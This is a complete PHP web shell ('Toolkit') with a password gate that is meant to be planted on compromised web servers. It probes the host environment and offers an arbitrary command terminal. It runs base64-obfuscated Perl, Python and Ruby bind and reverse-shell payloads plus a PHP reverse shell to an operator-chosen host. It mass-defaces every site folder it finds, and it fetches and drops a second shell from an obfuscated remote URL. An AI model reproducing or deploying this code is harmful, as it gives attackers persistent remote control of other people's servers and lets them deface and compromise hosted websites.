<?php
session_start();

$auth_key = "maw";
$session_lifetime = 1800;

if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {

    if (!isset($_GET['hl']) || $_GET['hl'] !== $auth_key) {
        header("HTTP/1.1 403 Forbidden");
        echo "<p>403 Forbidden</p>";
        exit;
    } else {
        $_SESSION['login'] = true;
        $_SESSION['expire'] = time() + $session_lifetime;
    }

} else {
    if (time() > $_SESSION['expire']) {
        session_unset();
        session_destroy();
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
}

?>



<?php
$os = php_uname('s');
$dir = (!preg_match("/Windows/", $os)) ? getcwd() : str_replace("\\", "/", getcwd());

$curl = (function_exists('curl_version')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
$wget = (@shell_exec('wget --help')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
$perl = (@shell_exec('perl --help')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
$ruby = (@shell_exec('ruby --help')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
$python = (@shell_exec('python --help')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
$gcc = (@shell_exec('gcc --version')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
$pkexec = (@shell_exec('pkexec --version')) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
$disfuncs = @ini_get("disable_functions");
$showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";

function doFile($name, $content, $type)
{
    $open = fopen($name, $type);
    $write = fwrite($open, $content);
    fclose($open);

    return ($write !== false) ? true : false;
}

function request($url, $type = "ifWebsite")
{
    $return = [];

    $context = stream_context_create([
        "ssl" => [
            "verify_peer" => false,
            "verify_peer_name" => false,
        ],
    ]);

    $url = (!preg_match("/http:\/\//", $url) || !preg_match("/https:\/\//", $url)) ? "http://$url" : $url;

    if ($type === "getContent") {
        $request = @file_get_contents($url, false, $context);
        $return["content"] = $request;

    } else {
        $request = @get_headers($url, false, $context);
    }

    $return["success"] = ($request !== false) ? "1" : "0";
    return $return;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Toolkit</title>
    <style>
        body {
            background-color: #000000;
            color: #fff;
            text-align: center;
        }

        a {
            color: #d6d4d4;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
            text-underline-offset: 5px;
            color: #fff;
        }

        .terminal {
            background-color: #000;
            color: #fff;
            font-family: monospace;
            letter-spacing: 1px;
            width: 100%;
            max-width: 550px;
            height: 250px;
            margin-top: 15px;
        }

        label {
            display: block;
            margin-bottom: 3px;
        }

        input {
            margin-bottom: 7px;
            padding: 3px;
        }
    </style>
</head>

<body>
    <span><?= php_uname(); ?></span>
    <p>
        CURL : <?= $curl ?>, WGET : <?= $wget; ?>, PERL : <?= $perl ?>, GCC : <?= $gcc ?><br>
        RUBY : <?= $ruby ?>, PYTHON : <?= $python ?>, PKEXEC : <?= $pkexec ?><br>
        DISABLED FUNCTIONS: <?= $showdisbfuncs; ?>
    </p>
    <?php
    if (isset($_GET["network"])) {
    ?>

        <h4 class='text-center mb-4'>Back Connect Tools</h4>
        <form method='post'>
            <div class='row'>
                <div class='col-md-10'>
                    <span>Bind port to /bin/sh [Perl]</span><br />
                    <label>Port :</label>
                    <div class='form-group input-group mb-4'>
                        <input type='text' name='port' class='form-control' value='6969'>
                        <input type='submit' name='bpl' class='btn btn-danger form-control' value='Reserve'>
                    </div>
                    <h5>Back-Connect</h5>
                    <label>Server :</label>
                    <input type='text' name='server' class='form-control mb-3' placeholder='<?= $_SERVER['REMOTE_ADDR']; ?>' autocomplete='off'><br>
                    <label>Port :</label>
                    <input type='text' name='port' class='form-control' placeholder='443' autocomplete='off'><br>
                    <select class='form-control' name='backconnect'>
                        <option value='perl'>Perl</option>
                        <option value='php'>PHP</option>
                        <option value='python'>Python</option>
                        <option value='ruby'>Ruby</option>
                    </select>
                    <input type='submit' class='btn btn-danger btn-block' value='Connect'>
                </div>
            </div>
        </form>

        <?php
        if (isset($_POST['bpl'])) {
            $bp = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=');
            $brt = @fopen('bp.pl', 'w');
            fwrite($brt, $bp);
            $out = @shell_exec('perl bp.pl ' . $_POST['port'] . ' 1>/dev/null 2>&1 &');
            sleep(1);
            echo "<pre class='text-light'>$out\n" . @shell_exec('ps aux | grep bp.pl') . '</pre>';
            unlink('bp.pl');
            exit;
        }
        if (isset($_POST['backconnect']) && $_POST['backconnect'] == 'perl') {
            $bc = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7');
            $plbc = @fopen('bc.pl', 'w');
            fwrite($plbc, $bc);
            $out = @shell_exec('perl bc.pl ' . $_POST['server'] . ' ' . $_POST['port'] . ' 1>/dev/null 2>&1 &');
            sleep(1);
            echo "<pre class='text-light'>$out\n" . @shell_exec('ps aux | grep bc.pl') . '</pre>';
            unlink('bc.pl');
            exit;
        }
        if (isset($_POST['backconnect']) && $_POST['backconnect'] == 'python') {
            $becaa = base64_decode('IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=');
            $pbcaa = @fopen('bcpyt.py', 'w');
            fwrite($pbcaa, $becaa);
            $out1 = @shell_exec('python bcpyt.py ' . $_POST['server'] . ' ' . $_POST['port']);
            sleep(1);
            echo "<pre class='text-light'>$out1\n" . @shell_exec('ps aux | grep bcpyt.py') . '</pre>';
            unlink('bcpyt.py');
            exit;
        }
        if (isset($_POST['backconnect']) && $_POST['backconnect'] == 'ruby') {
            $becaak = base64_decode('IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k');
            $pbcaak = @fopen('bcruby.rb', 'w');
            fwrite($pbcaak, $becaak);
            $out2 = @shell_exec('ruby bcruby.rb ' . $_POST['server'] . ' ' . $_POST['port']);
            sleep(1);
            echo "<pre class='text-light'>$out2\n" . @shell_exec('ps aux | grep bcruby.rb') . '</pre>';
            unlink('bcruby.rb');
            exit;
        }
        if (isset($_POST['backconnect']) && $_POST['backconnect'] == 'php') {
            $ip = $_POST['server'];
            $port = $_POST['port'];
            $sockfd = fsockopen($ip, $port, $errno, $errstr);
            if ($errno != 0) {
                echo "<font color='red'>$errno : $errstr</font>";
            } elseif (!$sockfd) {
                $result = '<p>Unexpected error has occured, connection may have failed.</p>';
            } else {
                fwrite($sockfd, "
            \n{#######################################}
            \n..:: BackConnect PHP By Con7ext ::..
            \n{#######################################}\n");
                $dir = @shell_exec('pwd');
                $sysinfo = @shell_exec('uname -a');
                $time = @shell_exec('time');
                $len = 1337;
                fwrite($sockfd, 'User ', $sysinfo, 'connected @ ', $time, "\n\n");
                while (!feof($sockfd)) {
                    $cmdPrompt = '[kuda]#:> ';
                    @fwrite($sockfd, $cmdPrompt);
                    $command = fgets($sockfd, $len);
                    @fwrite($sockfd, "\n" . @shell_exec($command) . "\n\n");
                }
                @fclose($sockfd);
            }
            exit;
        }
    } elseif (isset($_GET["cmd"])) {
        ?>

        <form method='post'>
            <label for='cmd'>Command: </label>
            <input type='text' name='cmd' id='cmd' value="<?= (isset($_POST['cmd'])) ? $_POST['cmd'] : ''; ?>" autocomplete='off'>
            <input type='submit' name='exec' value='Exec'>
        </form>

        <?php
        if (isset($_POST["exec"])) {
            echo "<textarea class='terminal' disabled>" . @shell_exec($_POST["cmd"]) . "</textarea>";
        }
    } elseif (isset($_GET["mass"])) {
        if (isset($_POST["mass"])) {
            $from = $_POST["from"];
            $dest = $_POST["dest"];
            $filename = $_POST["filename"];
            $script = $_POST["script"];
            $scandir = scandir($from);

            $results = [
                "websites" => [],
                "folders" => []
            ];

            foreach ($scandir as $folder) {
                if ($folder == ".." || $folder == "." || !is_dir($folder)) continue;

                $savefile = (!empty($dest)) ? "$from/$folder/$dest/$filename" : "$from/$folder/$filename";
                $save = doFile($savefile, $script, "w");

                if ($save) {
                    $request = request($folder);

                    if ($request["success"] == "1") {
                        $results["websites"][] = "<a href='http://$folder/$filename'>$folder/$filename</a>";
                    } else {
                        $results["folders"][] = "$folder/$filename";
                    }
                }
            }

            if (!empty($results["websites"]) && !empty($results["folders"])) {
                $websites = implode("<br>", $results["websites"]);
                $folders = implode("<br>", $results["folders"]);

                echo "Websites:<br>";
                echo "$websites<br>";

                echo "<br>Folders:<br>";
                echo "$folders<br>";
            } else {
                echo "Mass Deface failed";
            }
        } else {
        ?>

            <form method="post">
                <label for="from">From: </label>
                <input type="text" name="from" id="from" value="<?= $dir; ?>"><br>
                <label for="dest">Additional Destination (optional): </label>
                <input type="text" name="dest" id="dest" placeholder="public_html"><br>
                <label for="filename">Filename: </label>
                <input type="text" name="filename" id="filename" value="maw.txt"><br>
                <label for="script">Script: </label>
                <textarea name="script" id="script" cols="40" rows="12">Hello Friend? @Maw3six</textarea><br>
                <input type="submit" name="mass" value="Submit">
            </form>

<?php
    }
} elseif (isset($_GET["anon"])) {
    $base64_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hdzNzaXgvbWF3M3NpeC9yZWZzL2hlYWRzL21haW4vYnlwYXNzZWQvc21hbGwtYW5vbi5waHA=";
    $remote_url = base64_decode($base64_url);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($content !== false && $http_code == 200) {
        $create = doFile("anon.php", $content, "w");

        if ($create) {
            echo "<a href='anon.php'>anon.php</a> has been spawned!<br>";
            echo "You can now try to reverse shell";
        } else {
            echo "anon.php failed to spawned!";
        }
    } else {
        echo "Failed to fetch remote content via cURL!";
    }
}
?>

    <div style=" margin-top: 10px;">
        <a href="?">Home</a> |
        <a href="?cmd">Terminal</a> |
        <a href="?network">Network</a> |
        <a href="?mass">Mass Deface</a> |
        <a href="?anon">Spawn Anon</a>
    </div>
</body>

</html>
